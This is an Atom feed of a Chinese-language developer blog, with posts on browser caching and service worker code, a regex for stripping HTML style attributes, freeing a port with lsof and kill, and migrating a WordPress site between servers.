<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Justin&#39;s Words</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://youngdze.co/"/>
  <updated>2017-08-13T11:15:57.000Z</updated>
  <id>http://youngdze.co/</id>
  
  <author>
    <name>Justin Young</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Service workers</title>
    <link href="http://youngdze.co/2017/08/13/service-worker/"/>
    <id>http://youngdze.co/2017/08/13/service-worker/</id>
    <published>2017-08-13T11:08:41.000Z</published>
    <updated>2017-08-13T11:15:57.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常用-web-静态资源的缓存"><a href="#常用-web-静态资源的缓存" class="headerlink" title="常用 web 静态资源的缓存"></a>常用 web 静态资源的缓存</h2><ul><li>代理服务器缓存</li><li>CDN 缓存</li><li>浏览器端缓存</li></ul><h3 id="浏览器缓存"><a href="#浏览器缓存" class="headerlink" title="浏览器缓存"></a>浏览器缓存</h3><ul><li>Cache-Control: max-age=3600(s) | no-cache | no-store</li><li>Pragma: no-cache | Pragma</li><li>Expires: Fri, 11 Aug 2017, 17:00:00 GMT</li><li>Last-Modified: Fri, 11 Aug 2017, 17:00:00 GMT</li><li>If-Modified-Since: Fri, 11 Aug 2017, 17:00:00 GMT</li><li>Etag: “v2.6”</li><li>If-None-Match: “v2.6”</li></ul><p>no-cache 是允许缓存的，但是使用缓存之前必须和服务器进行新鲜度对比，no-store 才是禁止缓存。</p><a id="more"></a><h2 id="AppCache"><a href="#AppCache" class="headerlink" title="AppCache"></a>AppCache</h2><p>对app内存缓存的方案，具体表现为当请求某个文件时不是从网络获取该文件，而是从本地获取。</p><p>index.appcache</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">CACHE MANIFEST</div><div class="line">index.html</div><div class="line">index.css</div><div class="line">index.js</div><div class="line">logo.jpg</div><div class="line">NETWORK:</div><div class="line">*</div><div class="line">FALLBACK:</div><div class="line">/404.html</div></pre></td></tr></table></figure><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">manifest</span>=<span class="string">"index.appcache"</span>&gt;</span></div><div class="line">...</div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure><p>这样的话，每次都会请求 index.appcache，如果请求的文件存在在 <code>index.appcache</code> 里面，就无需向服务器请求。</p><h3 id="弊端"><a href="#弊端" class="headerlink" title="弊端"></a>弊端</h3><ul><li>除非改变 index.appcache，否则 index.appcache 里面的文件永远只会来自应用缓存</li><li>不在 appcache 缓存列表里面的文件不会被缓存，再次请求也不会去请求 😶</li></ul><h2 id="Service-workers"><a href="#Service-workers" class="headerlink" title="Service workers"></a>Service workers</h2><p>本质上充当浏览器和网络之间的代理服务器。它们旨在能够创建有效的离线体验，拦截网络请求并基于网络是否可用判断资源是否需要更新来采取适当的动作。他们还允许访问推送通知和后台同步API。</p><p>Service worker 运行在 worker 线程，和驱动应用的 JavaScript 线程是分开的，两者相互不受影响，所以 Service worker 是不能访问 DOM 的。</p><p>完全的使用 Promise 异步设计，不允许使用同步 API。必须在 HTTPS 下使用，但是调试的时候在 localhost 下面可以使用 HTTP。</p><p>X5 内核浏览器是支持 service worker 的。</p><h3 id="Service-workers-生命周期"><a href="#Service-workers-生命周期" class="headerlink" title="Service workers 生命周期"></a>Service workers 生命周期</h3><p><img src="/images/sw-lifecycle.png" alt=""></p><h3 id="Service-workers-监听事件"><a href="#Service-workers-监听事件" class="headerlink" title="Service workers 监听事件"></a>Service workers 监听事件</h3><p><img src="/images/sw-events.png" alt=""></p><h3 id="入口"><a href="#入口" class="headerlink" title="入口"></a>入口</h3><p>这里指定的 <code>sw.js</code> 是在 worker 线程工作，所以它不能访问 DOM。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">registerSW</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (<span class="string">'serviceWorker'</span> <span class="keyword">in</span> navigator) &#123;</div><div class="line">   <span class="comment">// 指定 service worker 执行文件和其控制的文件的子目录</span></div><div class="line">    <span class="keyword">return</span> navigator.serviceWorker.register(<span class="string">'/sw.js'</span>, &#123;<span class="attr">scope</span>: <span class="string">'/'</span>&#125;)</div><div class="line">      .then(<span class="function"><span class="params">reg</span> =&gt;</span> &#123;</div><div class="line">        <span class="keyword">if</span> (reg.installing) &#123;</div><div class="line">          log(<span class="string">'Service worker status'</span>, <span class="string">'installing'</span>);</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (reg.waiting) &#123;</div><div class="line">          log(<span class="string">'Service worker status'</span>, <span class="string">'waiting'</span>);</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (reg.active) &#123;</div><div class="line">          log(<span class="string">'Service worker status'</span>, <span class="string">'active'</span>);</div><div class="line">        &#125;</div><div class="line">      &#125;).catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</div><div class="line">        <span class="built_in">console</span>.error(<span class="string">`Registration failed with <span class="subst">$&#123;error&#125;</span>`</span>);</div><div class="line">      &#125;);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 需要缓存的文件列表，可以通过 Legos 生成或者 Webpack 获取</span></div><div class="line"><span class="keyword">const</span> assets = [</div><div class="line">  <span class="string">"/bg-header.24e53c7254a141935d68580e59ac3e2a.jpg"</span>,</div><div class="line">  <span class="string">"/i-logo.fe4eaaab959dae955171e85dd6451f01.png"</span>,</div><div class="line">  <span class="string">"/sprite-index.155b7aa999c0b00c8b3041e88dab5e3a.png"</span>,</div><div class="line">  <span class="string">"/bundle.9eb1d16891f485d70cfd.js"</span>,</div><div class="line">  <span class="string">"/style.9eb1d16891f485d70cfd.css"</span></div><div class="line">];</div><div class="line"></div><div class="line"><span class="comment">// 版本号</span></div><div class="line"><span class="keyword">const</span> CACHE_NAME = (<span class="keyword">new</span> <span class="built_in">Date</span>()).toISOString();</div><div class="line"></div><div class="line"><span class="comment">// 执行安装，将需要缓存的文件存入 CacheStorage</span></div><div class="line">self.addEventListener(<span class="string">'install'</span>, event =&gt; &#123;</div><div class="line">  event.waitUntil(</div><div class="line">    caches.open(CACHE_NAME)</div><div class="line">    .then(<span class="function"><span class="params">cache</span> =&gt;</span> &#123;</div><div class="line">      log(<span class="string">'Install'</span>, assets);</div><div class="line">      <span class="keyword">return</span> cache.addAll(assets);</div><div class="line">    &#125;).then(self.skipWaiting)</div><div class="line">  );</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h3 id="请求拦截"><a href="#请求拦截" class="headerlink" title="请求拦截"></a>请求拦截</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 这里会监听浏览器的 HTTP 请求，并做一层拦截</span></div><div class="line">self.addEventListener(<span class="string">'fetch'</span>, event =&gt; &#123;</div><div class="line">  event.respondWith(</div><div class="line">    caches.match(event.request)</div><div class="line">    .then(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</div><div class="line">      <span class="keyword">if</span> (response) &#123;</div><div class="line">        <span class="comment">// 如果这个请求已经缓存过了，则直接使用 Cache 里面的缓存</span></div><div class="line">        log(<span class="string">'Use cache'</span>, response.url);</div><div class="line">        <span class="keyword">return</span> response;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      <span class="comment">// 如果没有请求过，前往服务器请求</span></div><div class="line">      <span class="keyword">return</span> fetch(event.request).then(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</div><div class="line">        <span class="keyword">if</span> (!response || response.status !== <span class="number">200</span> || response.type !== <span class="string">'basic'</span>) &#123;</div><div class="line">          <span class="keyword">return</span> response;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        log(<span class="string">'Fetch'</span>, event.request);</div><div class="line"></div><div class="line">       <span class="comment">// 将新的请求回复也缓存下来</span></div><div class="line">        <span class="keyword">let</span> responseToCache = response.clone();</div><div class="line">        caches.open(CACHE_NAME)</div><div class="line">          .then(<span class="function"><span class="params">cache</span> =&gt;</span> &#123;</div><div class="line">            cache.put(event.request, responseToCache);</div><div class="line">            log(<span class="string">'Add fetch'</span>, event.request);</div><div class="line">          &#125;);</div><div class="line">      &#125;).catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</div><div class="line">        log(<span class="string">'Fetch failed'</span>, error);</div><div class="line">      &#125;);</div><div class="line">    &#125;)</div><div class="line">  );</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h3 id="缓存更新"><a href="#缓存更新" class="headerlink" title="缓存更新"></a>缓存更新</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"> * 如果请求回来的 sw.js 有改变，则触发 activate 事件，</span></div><div class="line"><span class="comment"> * 然后触发 install 事件重新拉取文件进行缓存</span></div><div class="line"><span class="comment"> */</span></div><div class="line">self.addEventListener(<span class="string">'activate'</span>, event =&gt; &#123;</div><div class="line">  event.waitUntil(</div><div class="line">    caches.keys().then(</div><div class="line">      keys =&gt; <span class="built_in">Promise</span>.all(</div><div class="line">        keys</div><div class="line">        .filter(<span class="function"><span class="params">key</span> =&gt;</span> key !== CACHE_NAME)</div><div class="line">        .map(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</div><div class="line">          <span class="comment">// 把旧的缓存全部删掉，以免占用空间</span></div><div class="line">          caches.delete(key);</div><div class="line">          log(<span class="string">'Delete cache'</span>, key);</div><div class="line">        &#125;)</div><div class="line">      )</div><div class="line">    ).then(self.skipWaiting)</div><div class="line">  );</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p><img src="/images/sw1.png" alt=""></p><p><img src="/images/sw2.png" alt=""></p><p><img src="/images/sw3.png" alt=""></p><h3 id="一些新的-API"><a href="#一些新的-API" class="headerlink" title="一些新的 API"></a>一些新的 API</h3><p>Request</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">interface</span> Request <span class="keyword">extends</span> Object, Body &#123;</div><div class="line">    readonly cache: RequestCache;</div><div class="line">    readonly credentials: RequestCredentials;</div><div class="line">    readonly destination: RequestDestination;</div><div class="line">    readonly headers: Headers;</div><div class="line">    readonly integrity: <span class="built_in">string</span>;</div><div class="line">    readonly keepalive: <span class="built_in">boolean</span>;</div><div class="line">    readonly method: <span class="built_in">string</span>;</div><div class="line">    readonly mode: RequestMode;</div><div class="line">    readonly redirect: RequestRedirect;</div><div class="line">    readonly referrer: <span class="built_in">string</span>;</div><div class="line">    readonly referrerPolicy: ReferrerPolicy;</div><div class="line">    readonly <span class="keyword">type</span>: RequestType;</div><div class="line">    readonly url: <span class="built_in">string</span>;</div><div class="line">    clone(): Request;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>Resopnse</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">interface</span> Response <span class="keyword">extends</span> Object, Body &#123;</div><div class="line">    readonly body: ReadableStream | <span class="literal">null</span>;</div><div class="line">    readonly headers: Headers;</div><div class="line">    readonly ok: <span class="built_in">boolean</span>;</div><div class="line">    readonly status: <span class="built_in">number</span>;</div><div class="line">    readonly statusText: <span class="built_in">string</span>;</div><div class="line">    readonly <span class="keyword">type</span>: ResponseType;</div><div class="line">    readonly url: <span class="built_in">string</span>;</div><div class="line">    clone(): Response;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>Cache 是一个专为为 Request 和 Response 对象提供缓存机制的接口，它可以把 Request 和 Response 对象缓存起来，并且提供一些很方便的 API 供调用。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">interface</span> Cache &#123;</div><div class="line"> <span class="comment">// 单个添加</span></div><div class="line">    add(request: RequestInfo): <span class="built_in">Promise</span>&lt;<span class="built_in">void</span>&gt;;</div><div class="line">    <span class="comment">// 批量添加</span></div><div class="line">    addAll(requests: RequestInfo[]): <span class="built_in">Promise</span>&lt;<span class="built_in">void</span>&gt;;</div><div class="line">    <span class="comment">// 单个删除</span></div><div class="line">    <span class="keyword">delete</span>(request: RequestInfo, options?: CacheQueryOptions): <span class="built_in">Promise</span>&lt;<span class="built_in">boolean</span>&gt;;</div><div class="line">    <span class="comment">// 获取存储的所有对象的 key</span></div><div class="line">    keys(request?: RequestInfo, options?: CacheQueryOptions): <span class="built_in">any</span>;</div><div class="line">    <span class="comment">// 查看是否存有该对象</span></div><div class="line">    match(request: RequestInfo, options?: CacheQueryOptions): <span class="built_in">Promise</span>&lt;Response&gt;;</div><div class="line">    <span class="comment">// 批量查看是否存有这些对象</span></div><div class="line">    matchAll(request?: RequestInfo, options?: CacheQueryOptions): <span class="built_in">any</span>;</div><div class="line">    <span class="comment">// 添加对象</span></div><div class="line">    put(request: RequestInfo, response: Response): <span class="built_in">Promise</span>&lt;<span class="built_in">void</span>&gt;;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://x5.tencent.com/tbs/guide/serviceworker.html" target="_blank" rel="external">https://x5.tencent.com/tbs/guide/serviceworker.html</a></p><p><a href="https://alistapart.com/article/application-cache-is-a-douchebag" target="_blank" rel="external">https://alistapart.com/article/application-cache-is-a-douchebag</a></p><p><a href="http://harttle.com/2017/04/10/service-worker-update.html" target="_blank" rel="external">http://harttle.com/2017/04/10/service-worker-update.html</a></p><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API/Using_Service_Workers" target="_blank" rel="external">https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API/Using_Service_Workers</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;常用-web-静态资源的缓存&quot;&gt;&lt;a href=&quot;#常用-web-静态资源的缓存&quot; class=&quot;headerlink&quot; title=&quot;常用 web 静态资源的缓存&quot;&gt;&lt;/a&gt;常用 web 静态资源的缓存&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;代理服务器缓存&lt;/li&gt;
&lt;li&gt;CDN 缓存&lt;/li&gt;
&lt;li&gt;浏览器端缓存&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;浏览器缓存&quot;&gt;&lt;a href=&quot;#浏览器缓存&quot; class=&quot;headerlink&quot; title=&quot;浏览器缓存&quot;&gt;&lt;/a&gt;浏览器缓存&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Cache-Control: max-age=3600(s) | no-cache | no-store&lt;/li&gt;
&lt;li&gt;Pragma: no-cache | Pragma&lt;/li&gt;
&lt;li&gt;Expires: Fri, 11 Aug 2017, 17:00:00 GMT&lt;/li&gt;
&lt;li&gt;Last-Modified: Fri, 11 Aug 2017, 17:00:00 GMT&lt;/li&gt;
&lt;li&gt;If-Modified-Since: Fri, 11 Aug 2017, 17:00:00 GMT&lt;/li&gt;
&lt;li&gt;Etag: “v2.6”&lt;/li&gt;
&lt;li&gt;If-None-Match: “v2.6”&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;no-cache 是允许缓存的，但是使用缓存之前必须和服务器进行新鲜度对比，no-store 才是禁止缓存。&lt;/p&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="Service Workers" scheme="http://youngdze.co/tags/Service-Workers/"/>
    
  </entry>
  
  <entry>
    <title>正则匹配 XML 里面的属性</title>
    <link href="http://youngdze.co/2016/03/07/regex-match-xml-attribute/"/>
    <id>http://youngdze.co/2016/03/07/regex-match-xml-attribute/</id>
    <published>2016-03-07T01:27:10.000Z</published>
    <updated>2016-12-08T05:25:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>我遇到了这么一段字符串：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"</span>&gt;</span>vip范围<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"</span>&gt;</span>上架起始时间<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"</span>&gt;</span>上架道具ID<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"</span>&gt;</span>下架时间<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"</span>&gt;</span>充值时间<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div></pre></td></tr></table></figure><p>现在需要做的是把 <code>tag</code> 里面的 <code>style</code> 属性全部去掉变成这样 <code>&lt;p&gt;...&lt;/p&gt;</code>。</p><p>这里可以用的正则是 <code>/\sstyle=&quot;[^&quot;]*&quot;/ig</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> str = <span class="string">`&lt;p style="font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"&gt;vip范围&lt;/p&gt;&lt;p style="font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"&gt;上架起始时间&lt;/p&gt;&lt;p style="font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"&gt;上架道具ID&lt;/p&gt;&lt;p style="font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"&gt;下架时间&lt;/p&gt;&lt;p style="font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"&gt;充值时间&lt;/p&gt;`</span>;</div><div class="line"><span class="keyword">let</span> reg = <span class="regexp">/\sstyle="[^"]*"/ig</span>;</div><div class="line">str.replace(reg, <span class="string">''</span>);    <span class="comment">// "&lt;p&gt;vip范围&lt;/p&gt;&lt;p&gt;上架起始时间&lt;/p&gt;&lt;p&gt;上架道具ID&lt;/p&gt;&lt;p&gt;下架时间&lt;/p&gt;&lt;p&gt;充值时间&lt;/p&gt;"</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我遇到了这么一段字符串：&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="Regex" scheme="http://youngdze.co/tags/Regex/"/>
    
  </entry>
  
  <entry>
    <title>杀掉占用某个端口的进程</title>
    <link href="http://youngdze.co/2016/01/16/kill-daemon-of-specified-port/"/>
    <id>http://youngdze.co/2016/01/16/kill-daemon-of-specified-port/</id>
    <published>2016-01-16T10:16:08.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>操作如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">netstat -lntu</div><div class="line">lsof -i:[PORT]</div><div class="line"><span class="built_in">kill</span> [PID]</div></pre></td></tr></table></figure><h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><ul><li><a href="http://superuser.com/questions/529830/get-a-list-of-open-ports-in-linux" target="_blank" rel="external">Get a list of Open Ports in Linux</a></li><li><a href="http://stackoverflow.com/questions/11583562/how-to-kill-a-process-running-on-particular-port-in-linux" target="_blank" rel="external">How to kill a process running on particular port in Linux?</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;操作如下：&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;l
      
    
    </summary>
    
      <category term="Linux" scheme="http://youngdze.co/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>在服务器间迁移 wordpress</title>
    <link href="http://youngdze.co/2015/10/26/migrate-wordpress-between-severs/"/>
    <id>http://youngdze.co/2015/10/26/migrate-wordpress-between-severs/</id>
    <published>2015-10-26T02:04:04.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>我尝试把博客从 SAE 迁到阿里云，过程有些小磕碰，不过还是成功了，记录下。</p><h4 id="迁移数据库"><a href="#迁移数据库" class="headerlink" title="迁移数据库"></a>迁移数据库</h4><p>SAE 数据库是 MySQL，由于我数据过于庞大，不能通过 phpMyAdmin 导出，所以我使用了 SAE 的 <a href="http://www.sinacloud.com/doc/sae/php/mysql.html#deferredjob" target="_blank" rel="external">DeferredJob</a> 功能进行数据库导出。 <a id="more"></a></p><p>如果你使用的是自己的数据库导出就简单多了：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysqldump -u USERNAME -p DATABASE_NAME &gt; OUTPUT.sql</div></pre></td></tr></table></figure><p>可以用 <code>gzip</code> 压缩下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysqldump -u USERNAME -p DATABASE_NAME | gzip &gt; OUTPUT.sql.gz</div></pre></td></tr></table></figure><p>导出后上传到目标服务器，我用的是 <a href="https://www.digitalocean.com/community/tutorials/how-to-use-sftp-to-securely-transfer-files-with-a-remote-server" target="_blank" rel="external">sftp</a> 。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sftp username@host</div><div class="line">put saeOutput.sql</div></pre></td></tr></table></figure><p>然后在目标服务器 MySQL 导入，不过得先在 MySQL 命令界面创建个数据库来保存这份数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> wp;</div></pre></td></tr></table></figure><p>最后导入数据，这是在 <code>sh</code> 界面：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql -u USERNAME -p TARGET_DATABASE_NAME &lt; saeOutput.sql</div></pre></td></tr></table></figure><h4 id="迁移-wordpress-文件"><a href="#迁移-wordpress-文件" class="headerlink" title="迁移 wordpress 文件"></a>迁移 wordpress 文件</h4><p>把整个 wordpress 文件夹复制到目标服务器，在 <code>wp-config.php</code> 修改下数据库配置：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">define(<span class="string">'DB_NAME'</span>, MYSQL_DB);</div><div class="line"></div><div class="line"><span class="comment">/** MySQL database username */</span></div><div class="line">define(<span class="string">'DB_USER'</span>, MYSQL_USER);</div><div class="line"></div><div class="line"><span class="comment">/** MySQL database password */</span></div><div class="line">define(<span class="string">'DB_PASSWORD'</span>, MYSQL_PASS);</div><div class="line"></div><div class="line"><span class="comment">/** MySQL hostname */</span></div><div class="line">define(<span class="string">'DB_HOST'</span>, MYSQL_HOST_M.<span class="string">':'</span>.MYSQL_PORT);</div></pre></td></tr></table></figure><h4 id="改-URL"><a href="#改-URL" class="headerlink" title="改 URL"></a>改 URL</h4><p>需要改域名的话在当前主题的 <code>functions.php</code> 下添加以下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">update_option(<span class="string">'siteurl'</span>,<span class="string">'http://foo.bar'</span>);</div><div class="line">update_option(<span class="string">'home'</span>,<span class="string">'http://foo.bar'</span>);</div></pre></td></tr></table></figure><p>然后访问该 wordpress 目录在服务器的路径即可成功改域名，之后就可以把以上代码删掉了。</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="http://www.sitepoint.com/move-wordpress-new-server-without-losing-anything/" target="_blank" rel="external">http://www.sitepoint.com/move-wordpress-new-server-without-losing-anything/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我尝试把博客从 SAE 迁到阿里云，过程有些小磕碰，不过还是成功了，记录下。&lt;/p&gt;
